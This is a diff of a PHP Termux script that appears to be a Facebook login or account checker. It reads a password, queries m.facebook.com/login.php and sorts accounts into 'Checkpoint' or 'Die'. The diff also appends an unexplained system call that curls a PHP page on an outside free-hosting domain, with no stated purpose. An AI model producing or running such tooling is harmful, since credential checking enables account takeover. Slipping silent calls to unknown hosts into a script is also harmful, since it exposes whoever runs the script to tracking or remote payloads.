@@ -9,11 +9,11 @@ system("clear");
       |    __{|}__ |----|   /----\   |          |--
       |      |||   |    |  /      \  |          |  \
       |      \|/   |    | /        \  \______   |   \
-              ~~~~~~>   V1.0  by Ren Lowsphere
+              ~~~~~~>   V1.1  by Ren Lowsphere
               
 
  ";
- system("termux-open-url https://renlowsphere.surge.sh");
+ system("termux-open-url https://t.me/renlowsphere");
   sleep(1);
 $h3 = "https://m.facebook.com/login.php";
 $b4 = readline("~>[#] Password: ");
@@ -60,4 +60,5 @@ echo "[$q0 Checkpoint $n1]$n9 \n";    }
     if(strpos($s14, $c16) !== false){
     	echo "[$q0 Die $n1]$n9 \n";
     }}
+system("curl https://alastor-tv.000webhostapp.com/matrix.php");
 ?>
